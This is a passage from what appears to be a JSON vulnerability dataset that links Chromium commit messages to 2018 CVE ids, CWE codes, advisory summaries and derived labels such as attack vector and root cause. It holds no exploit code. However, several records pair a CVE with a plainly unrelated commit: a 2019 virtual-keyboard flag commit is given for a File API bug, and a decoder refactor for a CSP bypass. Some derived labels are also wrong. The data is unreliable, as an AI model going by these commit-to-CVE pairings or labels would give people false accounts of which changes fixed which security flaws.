attacker"},{"commit_id":"37747f4a4972e6d44d3f956f8d3a63255ef0941a","cve_id":"CVE-2018-6100","cwe_id":null,"commit_message":"Add more entries to the confusability mapping\n\nU+014B (\u014b) => n\nU+1004 (\u1004) => c\nU+100c (\u100c) => g\nU+1042 (\u1042) => j\nU+1054 (\u1054) => e\n\nBug: 811117,808316\nTest: components_unittests -gtest_filter=*IDN*\nChange-Id: I29f73c48d665bd9070050bd7f0080563635b9c63\nReviewed-on: https:\/\/chromium-review.googlesource.com\/919423\nReviewed-by: Peter Kasting <pkasting@chromium.org>\nCommit-Queue: Jungshik Shin <jshin@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#536955}","summary":"Incorrect handling of confusable characters in URL Formatter in Google Chrome on macOS prior to 66.0.3359.117 allowed a remote attacker to perform domain spoofing via IDN homographs via a crafted domain name.","commit_message_1":"add more entry to the confusability mapping","Vulnerability Type":"incorrect handling","Attack Vector":"via a crafted html page","Impact":"perform domain spoofing via idn homo","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"ba1513223e47b62ed53b61518b7f7b82ad1d8ccd","cve_id":"CVE-2018-6101","cwe_id":"CWE-20","commit_message":"DevTools: check Host header for being IP or localhost when connecting over RDP.\n\nBug: 813540\nChange-Id: I9338aa2475c15090b8a60729be25502eb866efb7\nReviewed-on: https:\/\/chromium-review.googlesource.com\/952522\nReviewed-by: Dmitry Gozman <dgozman@chromium.org>\nCommit-Queue: Pavel Feldman <pfeldman@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#541547}","summary":"A lack of host validation in DevTools in Google Chrome prior to 66.0.3359.117 allowed a remote attacker to execute arbitrary code via a crafted HTML page, if the user is running a remote DevTools debugging server.","commit_message_1":"check host header for being ip or localhost when connecting over rdp","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted html page , if the user is running a remote devtools debugging server","Impact":"execute arbitrary code","Root Cause":"caused by insufficient protection of remote debugging prototol","Attack Type":"remote attacker"},{"commit_id":"12c876ae82355de6285bf0879023f1d1f1822ecf","cve_id":"CVE-2018-6103","cwe_id":"CWE-20","commit_message":"Fix MediaObserver notifications in MediaStreamManager.\n\nThis CL fixes the stream type used to notify MediaObserver about\ncancelled MediaStream requests.\n\nBefore this CL, NUM_MEDIA_TYPES was used as stream type to indicate\nthat all stream types should be cancelled.\nHowever, the MediaObserver end does not interpret NUM_MEDIA_TYPES this\nway and the request to update the UI is ignored.\n\nThis CL sends a separate notification for each stream type so that the\nUI actually gets updated for all stream types in use.\n\nBug: 816033\nChange-Id: Ib7d3b3046d1dd0976627f8ab38abf086eacc9405\nReviewed-on: https:\/\/chromium-review.googlesource.com\/939630\nCommit-Queue: Guido Urdaneta <guidou@chromium.org>\nReviewed-by: Raymes Khoury <raymes@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#540122}","summary":"A stagnant permission prompt in Prompts in Google Chrome prior to 66.0.3359.117 allowed a remote attacker to bypass permission policy via a crafted HTML page.","commit_message_1":"fix mediaobserver notification in mediastreammanager","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted html page","Impact":"bypass permission policy","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"de9acc5cb3527da9173f01973d849bd47f91a9fd","cve_id":"CVE-2018-6104","cwe_id":null,"commit_message":"Add more to confusables list\n\nU+04FB (\u04fb) to f\nU+050F (\u050f) to t\nU+050B (\u050b) and U+0527 (\u0527) to h\nU+0437(\u0437) and U+04E1(\u04e1) to 3\n\nAdd tests for the above entries and tests for ASCII-digit spoofing.\n\nBug: 816769,820068\nTest: components_unittests --gtest_filter=*IDN*\nChange-Id: I6cd0a7e97cd0ec2df522ce30f632acfd7b78eee2\nReviewed-on: https:\/\/chromium-review.googlesource.com\/962875\nReviewed-by: Peter Kasting <pkasting@chromium.org>\nCommit-Queue: Peter Kasting <pkasting@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#543600}","summary":"Incorrect handling of confusable characters in URL Formatter in Google Chrome prior to 66.0.3359.117 allowed a remote attacker to perform domain spoofing via IDN homographs via a crafted domain name.","commit_message_1":"add more to confusables list u+04fb ( \u04fb ) to f u+050f ( \u050f ) to t u+050b ( \u050b ) and u+<number> ( \u0527 ) to h u+<number> ( \u0437 ) and u+04e1 ( \u04e1 ) to <number> add test for the above entry and test for ascii-digit spoofing","Vulnerability Type":"incorrect handling","Attack Vector":"via a crafted html page","Impact":"perform domain spoofing via idn","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"614dbccf01bf1f94427782719672dc5af4d4eb63","cve_id":"CVE-2018-6109","cwe_id":null,"commit_message":"Add Virtual Keyboard bordered key experiment to chrome flag\n\nBUG: b\/143232594\n\nChange-Id: I76b160ad565649db32a21b984fbed1594b0ae6ec\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1875347\nReviewed-by: Scott Violet <sky@chromium.org>\nCommit-Queue: My Nguyen <myy@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#710190}","summary":"readAsText() can indefinitely read the file picked by the user, rather than only once at the time the file is picked in File API in Google Chrome prior to 66.0.3359.117 allowed a remote attacker to access data on the user file system without explicit consent via a crafted HTML page.","commit_message_1":"add virtual keyboard bordered key experiment to chrome flag","Vulnerability Type":"incorrect handling","Attack Vector":"via a crafted html page","Impact":"access data on the user file system without explicit","Root Cause":"caused by the incorrect handling of files by FileAPI","Attack Type":"remote attacker"},{"commit_id":"9afc491d6d64d54bf01f526abcc3d8344d90fa42","cve_id":"CVE-2018-6110","cwe_id":null,"commit_message":"Revert \"Don't sniff HTML from documents delivered via the file protocol\"\n\nThis reverts commit 3519e867dc606437f804561f889d7ed95b95876a.\n\nReason for revert: crbug.com\/786150. Application compatibility for Android WebView applications means we need to allow sniffing on that platform. \n\nOriginal change's description:\n> Don't sniff HTML from documents delivered via the file protocol\n> \n> To reduce attack surface, Chrome should not MIME-sniff to text\/html for\n> any document delivered via the file protocol. This change only impacts\n> the file protocol (documents served via HTTP\/HTTPS\/etc are unaffected).\n> \n> Bug: 777737\n> Cq-Include-Trybots: master.tryserver.chromium.android:android_cronet_tester;master.tryserver.chromium.mac:ios-simulator-cronet\n> Change-Id: I7086454356b8d2d092be9e1bca0f5ff6dd3b62c0\n> Reviewed-on: https:\/\/chromium-review.googlesource.com\/751402\n> Reviewed-by: Ben Wells <benwells@chromium.org>\n> Reviewed-by: Sylvain Defresne <sdefresne@chromium.org>\n> Reviewed-by: Achuith Bhandarkar <achuith@chromium.org>\n> Reviewed-by: Asanka Herath <asanka@chromium.org>\n> Reviewed-by: Matt Menke <mmenke@chromium.org>\n> Commit-Queue: Eric Lawrence <elawrence@chromium.org>\n> Cr-Commit-Position: refs\/heads\/master@{#514372}\n\nTBR=achuith@chromium.org,benwells@chromium.org,mmenke@chromium.org,sdefresne@chromium.org,asanka@chromium.org,elawrence@chromium.org\n\n# Not skipping CQ checks because original CL landed > 1 day ago.\n\nBug: 777737\nChange-Id: I864ae060ce3277d41ea257ae75e0b80c51f3ea98\nCq-Include-Trybots: master.tryserver.chromium.android:android_cronet_tester;master.tryserver.chromium.mac:ios-simulator-cronet\nReviewed-on: https:\/\/chromium-review.googlesource.com\/790790\nReviewed-by: Eric Lawrence <elawrence@chromium.org>\nReviewed-by: Matt Menke <mmenke@chromium.org>\nCommit-Queue: Eric Lawrence <elawrence@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#519347}","summary":"Parsing documents as HTML in Downloads in Google Chrome prior to 66.0.3359.117 allowed a remote attacker to cause Chrome to execute scripts via a local non-HTML page.","commit_message_1":"revert `` do n't sniff html from document delivered via the file protocol '' this reverts commit 3519e867dc606437f804561f889d7ed95b95876a","Vulnerability Type":"incorrect handling","Attack Vector":"via a local non html page ","Impact":"cause chrome to execute","Root Cause":"caused by the incorrect handling of plaintext files via file:\/\/","Attack Type":"remote attacker"},{"commit_id":"3c8e4852477d5b1e2da877808c998dc57db9460f","cve_id":"CVE-2018-6111","cwe_id":"CWE-20","commit_message":"DevTools: speculative fix for crash in NetworkHandler::Disable\n\nThis keeps BrowserContext* and StoragePartition* instead of\nRenderProcessHost* in an attemp to resolve UAF of RenderProcessHost\nupon closure of DevTools front-end.\n\nBug: 801117, 783067, 780694\nChange-Id: I6c2cca60cc0c29f0949d189cf918769059f80c1b\nReviewed-on: https:\/\/chromium-review.googlesource.com\/876657\nCommit-Queue: Andrey Kosyakov <caseq@chromium.org>\nReviewed-by: Dmitry Gozman <dgozman@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#531157}","summary":"An object lifetime issue in the developer tools network handler in Google Chrome prior to 66.0.3359.117 allowed a local attacker to execute arbitrary code via a crafted HTML page.","commit_message_1":"speculative fix for crash in networkhandler : :disable this keep browsercontext * and storagepartition * instead of renderprocesshost * in an attemp to resolve uaf of renderprocesshost upon closure of devtools front-end","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted html page","Impact":"execute arbitrary code","Root Cause":"caused by a heap-use-after-free","Attack Type":"local attacker"},{"commit_id":"e56aee6473486fdfac0429747284fda7cdd3aae5","cve_id":"CVE-2018-6114","cwe_id":"CWE-20","commit_message":"Use correct Request Context when EMBED or OBJECT requests an image\n\nWhen an OBJECT or EMBED element requests an image, it does so using\nan ImageLoader. To ensure that Content-Security-Policy restrictions\nare applied correctly in this scenario, we must adjust the request's\ncontext to indicate the originating element.\n\nBug: 811691\nChange-Id: I0fd8010970a12e68e845a54310695acc0b3f7625\nReviewed-on: https:\/\/chromium-review.googlesource.com\/924589\nCommit-Queue: Eric Lawrence <elawrence@chromium.org>\nReviewed-by: Mike West <mkwst@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#537846}","summary":"Incorrect enforcement of CSP for <object> tags in Blink in Google Chrome prior to 66.0.3359.117 allowed a remote attacker to bypass content security policy via a crafted HTML page.","commit_message_1":"use correct request context when embed or object request an image when an object or embed element request an image , it doe so using an imageloader","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted html page","Impact":"bypass content security policy","Root Cause":"Incorrect enforcement of CSP for <object> tags","Attack Type":"remote attacker"},{"commit_id":"bd0fde2518644eea1cc53a01e3e3cce1c70e7157","cve_id":"CVE-2018-6115","cwe_id":"CWE-20","commit_message":"Remove use of SEE_MASK_FLAG_NO_UI from Chrome Windows installer.\n\nThis flag was originally added to ui::base::win to suppress a specific\nerror message when attempting to open a file via the shell using the\n\"open\" verb. The flag has additional side-effects and shouldn't be used\nwhen invoking ShellExecute().\n\nR=grt@chromium.org\n\nBug: 819809\nChange-Id: I7db2344982dd206c85a73928e906c21e06a47a9e\nReviewed-on: https:\/\/chromium-review.googlesource.com\/966964\nCommit-Queue: Greg Thompson <grt@chromium.org>\nReviewed-by: Greg Thompson <grt@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#544012}","summary":"Inappropriate setting of the SEE_MASK_FLAG_NO_UI flag in file downloads in Google Chrome prior to 66.0.3359.117 allowed a remote attacker to potentially bypass OS malware checks via a crafted HTML page.","commit_message_1":"remove use of see_mask_flag_no_ui from chrome window installer","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted html page","Impact":"potentially bypass os malware checks","Root Cause":"Inappropriate setting of the SEE_MASK_FLAG_NO_UI flag","Attack Type":"remote attacker"},{"commit_id":"52f6eb4221430b6248fd5a59bec53bfef9fdd9a7","cve_id":"CVE-2018-6117","cwe_id":"CWE-200","commit_message":"[md-settings] Clarify Password Saving and Autofill Toggles\n\nThis change clarifies the wording around the password saving and\nautofill toggles.\n\nBug: 822465\nCq-Include-Trybots: master.tryserver.chromium.linux:closure_compilation\nChange-Id: I91b31fe61cd0754239f7908e8c04c7e69b72f670\nReviewed-on: https:\/\/chromium-review.googlesource.com\/970541\nCommit-Queue: Jan Wilken D\u00f6rrie <jdoerrie@chromium.org>\nReviewed-by: Vaclav Brozek <vabr@chromium.org>\nReviewed-by: Jochen Eisinger <jochen@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#544661}","summary":"Confusing settings in Autofill in Google Chrome prior to 66.0.3359.117 allowed a remote attacker to obtain potentially sensitive information from process memory via a crafted HTML page.","commit_message_1":"clarify password saving and autofill toggle this change clarifies the wording around the password saving and autofill toggle","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted html page","Impact":"obtain potentially sensitive information from process memory","Root Cause":"caused by an error related to confusing autofill settings","Attack Type":"remote attacker"},{"commit_id":"fd6a5115103b3e6a52ce15858c5ad4956df29300","cve_id":"CVE-2018-6060","cwe_id":"CWE-416","commit_message":"Revert \"Keep AudioHandlers alive until they can be safely deleted.\"\n\nThis reverts commit 071df33edf2c8b4375fa432a83953359f93ea9e4.\n\nReason for revert:\nThis CL seems to cause an AudioNode leak on the Linux leak bot.\nThe log is:\nhttps:\/\/ci.chromium.org\/buildbot\/chromium.webkit\/WebKit%20Linux%20Trusty%20Leak\/14252\n* webaudio\/AudioNode\/audionode-connect-method-chaining.html\n* webaudio\/Panner\/pannernode-basic.html\n* webaudio\/dom-exceptions.html\n\nOriginal change's description:\n> Keep AudioHandlers alive until they can be safely deleted.\n> \n> When an AudioNode is disposed, the handler is also disposed.  But add\n> the handler to the orphan list so that the handler stays alive until\n> the context can safely delete it.  If we don't do this, the handler\n> may get deleted while the audio thread is processing the handler (due\n> to, say, channel count changes and such).\n> \n> For an realtime context, always save the handler just in case the\n> audio thread is running after the context is marked as closed (because\n> the audio thread doesn't instantly stop when requested).\n> \n> For an offline context, only need to do this when the context is\n> running because the context is guaranteed to be stopped if we're not\n> in the running state.  Hence, there's no possibility of deleting the\n> handler while the graph is running.\n> \n> This is a revert of\n> https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/860779, with\n> a fix for the leak.\n> \n> Bug: 780919\n> Change-Id: Ifb6b5fcf3fbc373f5779256688731245771da33c\n> Reviewed-on: https:\/\/chromium-review.googlesource.com\/862723\n> Reviewed-by: Hongchan Choi <hongchan@chromium.org>\n> Commit-Queue: Raymond Toy <rtoy@chromium.org>\n> Cr-Commit-Position: refs\/heads\/master@{#528829}\n\nTBR=rtoy@chromium.org,hongchan@chromium.org\n\nChange-Id: Ibf406bf6ed34ea1f03e86a64a1e5ba6de0970c6f\nNo-Presubmit: true\nNo-Tree-Checks: true\nNo-Try: true\nBug: 780919\nReviewed-on: https:\/\/chromium-review.googlesource.com\/863402\nReviewed-by: Taiju Tsuiki <tzik@chromium.org>\nCommit-Queue: Taiju Tsuiki <tzik@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#528888}","summary":"Use after free in WebAudio in Google Chrome prior to 65.0.3325.146 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page.","commit_message_1":"revert `` keep audiohandlers alive until they can be safely deleted","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted html page","Impact":"potentially exploit heap corruption","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"70340ce072cee8a0bdcddb5f312d32567b2269f6","cve_id":"CVE-2018-6061","cwe_id":"CWE-362","commit_message":"vaapi vda: Delete owned objects on worker thread in Cleanup()\n\nThis CL adds a SEQUENCE_CHECKER to Vaapi*Accelerator classes, and\nposts the destruction of those objects to the appropriate thread on\nCleanup().\n\nAlso makes {H264,VP8,VP9}Picture RefCountedThreadSafe, see miu@\ncomment in\nhttps:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/794091#message-a64bed985cfaf8a19499a517bb110a7ce581dc0f\n\nTEST=play back VP9\/VP8\/H264 w\/ simplechrome on soraka, Release build\nunstripped, let video play for a few seconds then navigate back; no\ncrashes. Unittests as before:\nvideo_decode_accelerator_unittest --test_video_data=test-25fps.vp9:320:240:250:250:35:150:12\nvideo_decode_accelerator_unittest --test_video_data=test-25fps.vp8:320:240:250:250:35:150:11\nvideo_decode_accelerator_unittest --test_video_data=test-25fps.h264:320:240:250:258:35:150:1\n\nBug: 789160\nCq-Include-Trybots: master.tryserver.chromium.android:android_optional_gpu_tests_rel;master.tryserver.chromium.linux:linux_optional_gpu_tests_rel;master.tryserver.chromium.mac:mac_optional_gpu_tests_rel;master.tryserver.chromium.win:win_optional_gpu_tests_rel\nChange-Id: I7d96aaf89c92bf46f00c8b8b36798e057a842ed2\nReviewed-on: https:\/\/chromium-review.googlesource.com\/794091\nReviewed-by: Pawel Osciak <posciak@chromium.org>\nCommit-Queue: Miguel Casas <mcasas@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#523372}","summary":"A race in the handling of SharedArrayBuffers in WebAssembly in Google Chrome prior to 65.0.3325.146 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page.","commit_message_1":"delete owned object on worker thread in cleanup ( ) this cl add a sequence_checker to vaapi * accelerator class , and post the destruction of those object to the appropriate thread on cleanup ( )","Vulnerability Type":"Race Condition","Attack Vector":"via a crafted html page","Impact":"potentially exploit heap corruption","Root Cause":"caused by a race condition","Attack Type":"remote attacker"},{"commit_id":"c0c8978849ac57e4ecd613ddc8ff7852a2054734","cve_id":"CVE-2018-6057","cwe_id":"CWE-732","commit_message":"android: Fix sensors in device service.\n\nThis patch fixes a bug that prevented more than one sensor data\nto be available at once when using the device motion\/orientation\nAPI.\n\nThe issue was introduced by this other patch [1] which fixed\nsome security-related issues in the way shared memory region\nhandles are managed throughout Chromium (more details at\nhttps:\/\/crbug.com\/789959).\n\nThe device service\u00b4s sensor implementation doesn\u00b4t work\ncorrectly because it assumes it is possible to create a\nwritable mapping of a given shared memory region at any\ntime. This assumption is not correct on Android, once an\nAshmem region has been turned read-only, such mappings\nare no longer possible.\n\nTo fix the implementation, this CL changes the following:\n\n- PlatformSensor used to require moving a\n  mojo::ScopedSharedBufferMapping into the newly-created\n  instance. Said mapping being owned by and destroyed\n  with the PlatformSensor instance.\n\n  With this patch, the constructor instead takes a single\n  pointer to the corresponding SensorReadingSharedBuffer,\n  i.e. the area in memory where the sensor-specific\n  reading data is located, and can be either updated\n  or read-from.\n\n  Note that the PlatformSensor does not own the mapping\n  anymore.\n\n- PlatformSensorProviderBase holds the *single* writable\n  mapping that is used to store all SensorReadingSharedBuffer\n  buffers. It is created just after the region itself,\n  and thus can be used even after the region's access\n  mode has been changed to read-only.\n\n  Addresses within the mapping will be passed to\n  PlatformSensor constructors, computed from the\n  mapping's base address plus a sensor-specific\n  offset.\n\n  The mapping is now owned by the\n  PlatformSensorProviderBase instance.\n\nNote that, security-wise, nothing changes, because all\nmojo::ScopedSharedBufferMapping before the patch actually\npointed to the same writable-page in memory anyway.\n\nSince unit or integration tests didn't catch the regression\nwhen [1] was submitted, this patch was tested manually by\nrunning a newly-built Chrome apk in the Android emulator\nand on a real device running Android O.\n\n[1] https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/805238\n\nBUG=805146\nR=mattcary@chromium.org,alexilin@chromium.org,juncai@chromium.org,reillyg@chromium.org\n\nChange-Id: I7d60a1cad278f48c361d2ece5a90de10eb082b44\nReviewed-on: https:\/\/chromium-review.googlesource.com\/891180\nCommit-Queue: David Turner <digit@chromium.org>\nReviewed-by: Reilly Grant <reillyg@chromium.org>\nReviewed-by: Matthew Cary <mattcary@chromium.org>\nReviewed-by: Alexandr Ilin <alexilin@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#532607}","summary":"Lack of special casing of Android ashmem in Google Chrome prior to 65.0.3325.146 allowed a remote attacker who had compromised the renderer process to bypass inter-process read only guarantees via a crafted HTML page.","commit_message_1":"fix sensor in device service","Vulnerability Type":"Incorrect Permission Assignment for Critical Resource","Attack Vector":"via a crafted html page .","Impact":"bypass security restrictions","Root Cause":"caused by incorrect permissions on shared memory","Attack Type":"remote attacker"},{"commit_id":"673ce95d481ea9368c4d4d43ac756ba1d6d9e608","cve_id":"CVE-2018-6063","cwe_id":"CWE-787","commit_message":"Correct mojo::WrapSharedMemoryHandle usage\n\nFixes some incorrect uses of mojo::WrapSharedMemoryHandle which\nwere assuming that the call actually has any control over the memory\nprotection applied to a handle when mapped.\n\nWhere fixing usage is infeasible for this CL, TODOs are added to\nannotate follow-up work.\n\nAlso updates the API and documentation to (hopefully) improve clarity\nand avoid similar mistakes from being made in the future.\n\nBUG=792900\n\nCq-Include-Trybots: master.tryserver.chromium.android:android_optional_gpu_tests_rel;master.tryserver.chromium.linux:linux_optional_gpu_tests_rel;master.tryserver.chromium.mac:mac_optional_gpu_tests_rel;master.tryserver.chromium.win:win_optional_gpu_tests_rel\nChange-Id: I0578aaa9ca3bfcb01aaf2451315d1ede95458477\nReviewed-on: https:\/\/chromium-review.googlesource.com\/818282\nReviewed-by: Wei Li <weili@chromium.org>\nReviewed-by: Lei Zhang <thestig@chromium.org>\nReviewed-by: John Abd-El-Malek <jam@chromium.org>\nReviewed-by: Daniel Cheng <dcheng@chromium.org>\nReviewed-by: Sadrul Chowdhury <sadrul@chromium.org>\nReviewed-by: Yuzhu Shen <yzshen@chromium.org>\nReviewed-by: Robert Sesek <rsesek@chromium.org>\nCommit-Queue: Ken Rockot <rockot@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#530268}","summary":"Incorrect use of mojo::WrapSharedMemoryHandle in Mojo in Google Chrome prior to 65.0.3325.146 allowed a remote attacker who had compromised the renderer process to perform an out of bounds memory write via a crafted HTML page.","commit_message_1":"usage fix some incorrect us of mojo : :wrapsharedmemoryhandle which were assuming that the call actually ha any control over the memory protection applied to a handle when mapped","Vulnerability Type":"Out-of-bounds Write","Attack Vector":"via a crafted html page","Impact":"perform an out of bounds memory write","Root Cause":"caused by incorrect permissions on shared memory","Attack Type":"remote attacker"},{"commit_id":"fad67a5b73639d7211b24fd9bdb242e82039b765","cve_id":"CVE-2018-6066","cwe_id":"CWE-200","commit_message":"Check CORS using PassesAccessControlCheck() with supplied SecurityOrigin\n\nPartial revert of https:\/\/chromium-review.googlesource.com\/535694.\n\nBug: 799477\nChange-Id: I878bb9bcb83afaafe8601293db9aa644fc5929b3\nReviewed-on: https:\/\/chromium-review.googlesource.com\/898427\nCommit-Queue: Hiroshige Hayashizaki <hiroshige@chromium.org>\nReviewed-by: Kouhei Ueno <kouhei@chromium.org>\nReviewed-by: Yutaka Hirano <yhirano@chromium.org>\nReviewed-by: Takeshi Yoshino <tyoshino@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#535176}","summary":"Lack of CORS checking by ResourceFetcher\/ResourceLoader in Blink in Google Chrome prior to 65.0.3325.146 allowed a remote attacker to leak cross-origin data via a crafted HTML page.","commit_message_1":"check cors using passesaccesscontrolcheck ( ) with supplied securityorigin partial revert of http : \/\/chromium-<file>","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted html page","Impact":"leak cross - origin data","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"9fe6e9f89a1c78b8b38e806d35651a15858b053b","cve_id":"CVE-2018-6067","cwe_id":"CWE-125","commit_message":"Update IPC ParamTraits for SkBitmap to follow best practices.\n\nUsing memcpy() to serialize a POD struct is highly discouraged. Just use\nthe standard IPC param traits macros for doing it.\n\nBug: 779428\nChange-Id: I48f52c1f5c245ba274d595829ed92e8b3cb41334\nReviewed-on: https:\/\/chromium-review.googlesource.com\/899649\nReviewed-by: Tom Sepez <tsepez@chromium.org>\nCommit-Queue: Daniel Cheng <dcheng@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#534562}","summary":"Incorrect IPC serialization in Skia in Google Chrome prior to 65.0.3325.146 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page.","commit_message_1":"update ipc paramtraits for skbitmap to follow best practice","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted html page","Impact":"potentially exploit heap corruption","Root Cause":"caused by improper bounds checking by Skia","Attack Type":"remote attacker"},{"commit_id":"f283cdf7c850f3db923a5303c7e01bd929d4117f","cve_id":"CVE-2018-6070","cwe_id":"CWE-79","commit_message":"Move Initialize() to VaapiImageDecoder parent class.\n\nThis CL moves the implementation of Initialize() to VaapiImageDecoder,\nsince it is common to all implementing classes.\n\nBug: 877694\nTest: jpeg_decode_accelerator_unittest\nChange-Id: Ic99601953ae1c7a572ba8a0b0bf43675b2b0969d\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1654249\nCommit-Queue: Gil Dekel <gildekel@chromium.org>\nReviewed-by: Andres Calderon Jaramillo <andrescj@chromium.org>\nReviewed-by: Miguel Casas <mcasas@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#668645}","summary":"Lack of CSP enforcement on WebUI pages in Bink in Google Chrome prior to 65.0.3325.146 allowed an attacker who convinced a user to install a malicious extension to bypass content security policy via a crafted Chrome Extension.","commit_message_1":"move initialize ( ) to vaapiimagedecoder parent class","Vulnerability Type":"Cross-site Scripting","Attack Vector":"via a crafted chrome extension","Impact":"bypass security restrictions","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"c59ad14fc61393a50b2ca3e89c7ecaba7028c4c4","cve_id":"CVE-2018-6074","cwe_id":"CWE-20","commit_message":"DevTools: allow styling the page number element when printing over the protocol.\n\nBug: none\nChange-Id: I13e6afbd86a7c6bcdedbf0645183194b9de7cfb4\nReviewed-on: https:\/\/chromium-review.googlesource.com\/809759\nCommit-Queue: Pavel Feldman <pfeldman@chromium.org>\nReviewed-by: Lei Zhang <thestig@chromium.org>\nReviewed-by: Tom Sepez <tsepez@chromium.org>\nReviewed-by: Jianzhou Feng <jzfeng@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#523966}","summary":"Failure to apply Mark-of-the-Web in Downloads in Google Chrome prior to 65.0.3325.146 allowed a remote attacker to bypass OS level controls via a crafted HTML page.","commit_message_1":"allow styling the page number element when printing over the protocol","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted html page","Impact":"bypass os level controls","Root Cause":"Failure to apply Mark-of-the-Web","Attack Type":"remote attacker"},{"commit_id":"f8f6ed59949be4451ee2f5443d8a313f102fde60","cve_id":"CVE-2018-6076","cwe_id":"CWE-79","commit_message":"Percent-encode UTF8 characters in URL fragment identifiers.\n\nThis brings us into line with Firefox, Safari, and the spec.\n\nBug: 758523\nChange-Id: I7e354ab441222d9fd08e45f0e70f91ad4e35fafe\nReviewed-on: https:\/\/chromium-review.googlesource.com\/668363\nCommit-Queue: Mike West <mkwst@chromium.org>\nReviewed-by: Jochen Eisinger <jochen@chromium.org>\nReviewed-by: Andy Paicu <andypaicu@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#507481}","summary":"Insufficient encoding of URL fragment identifiers in Blink in Google Chrome prior to 65.0.3325.146 allowed a remote attacker to perform a DOM based XSS attack via a crafted HTML page.","commit_message_1":"percent-encode utf8 character in url fragment identifier","Vulnerability Type":"Cross-site Scripting","Attack Vector":"via a crafted html page","Impact":"perform a dom based xss attack","Root Cause":"related to the incorrect handling of URL fragment identifiers","Attack Type":"remote attacker"},{"commit_id":"6ed26f014f76f10e76e80636027a2db9dcbe1664","cve_id":"CVE-2018-6077","cwe_id":"CWE-200","commit_message":"[PE] Distinguish between tainting due to canvas content and filter.\n\nA filter on a canvas can itself lead to origin tainting, for reasons\nother than that the canvas contents are tainted. This CL changes\nto distinguish these two causes, so that we recompute filters\non content-tainting change.\n\nBug: 778506\nChange-Id: I3cec8ef3b2772f2af78cdd4b290520113092cca6\nReviewed-on: https:\/\/chromium-review.googlesource.com\/811767\nReviewed-by: Fredrik S\u00f6derquist <fs@opera.com>\nCommit-Queue: Chris Harrelson <chrishtr@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#522274}","summary":"Displacement map filters being applied to cross-origin images in Blink SVG rendering in Google Chrome prior to 65.0.3325.146 allowed a remote attacker to leak cross-origin data via a crafted HTML page.","commit_message_1":"distinguish between tainting due to canvas content and filter","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted html page","Impact":"leak cross - origin data","Root Cause":"caused by a timing attack using SVG filters","Attack Type":"remote attacker"},{"commit_id":"fe3c71592ccc6fd6f3909215e326ffc8fe0c35ce","cve_id":"CVE-2018-6078","cwe_id":"CWE-20","commit_message":"Add more confusable character map entries\n\nWhen comparing domain names with top 10k domain names for confusability,\ncharacters with diacritics are decomposed into base + diacritic marks\n(Unicode Normalization Form D) and diacritics are dropped before\ncalculating the confusability skeleton because two characters with and\nwithout a diacritics is NOT regarded as confusable.\n\nHowever, there are a dozen of characters (most of them are Cyrillic)\nwith a diacritic-like mark attached but they are not decomposed into\nbase + diacritics by NFD (e.g. U+049B, \u049b; Cyrillic Small Letter Ka\nwith Descender).  This CL treats them the same way as their \"base\"\ncharacters. For instance, \u049b (U+049B) is treated as confusable with\nLatin k because \u043a (U+043A; Cyrillic Small Letter Ka) is.\n\nThey're curated from the following sets:\n\n[:IdentifierStatus=Allowed:] &  [:Ll:] &\n  [[:sc=Cyrillic:] -\n  [[\\u01cd-\\u01dc][\\u1c80-\\u1c8f][\\u1e00-\\u1e9b][\\u1f00-\\u1fff]\n  [\\ua640-\\ua69f][\\ua720-\\ua7ff]]] &\n[:NFD_Inert=Yes:]\n\n[:IdentifierStatus=Allowed:] &  [:Ll:] &\n  [[:sc=Latin:] - [[\\u01cd-\\u01dc][\\u1e00-\\u1e9b][\\ua720-\\ua7ff]]] &\n[:NFD_Inert=Yes:]\n\n[:IdentifierStatus=Allowed:] &  [:Ll:] & [[:sc=Greek:]] &\n[:NFD_Inert=Yes:]\n\nBug: 793628,798892\nTest: components_unittests --gtest_filter=*IDN*\nChange-Id: I20c6af13defa295f6952f33d75987e87ce1853d0\nReviewed-on: https:\/\/chromium-review.googlesource.com\/860567\nCommit-Queue: Jungshik Shin 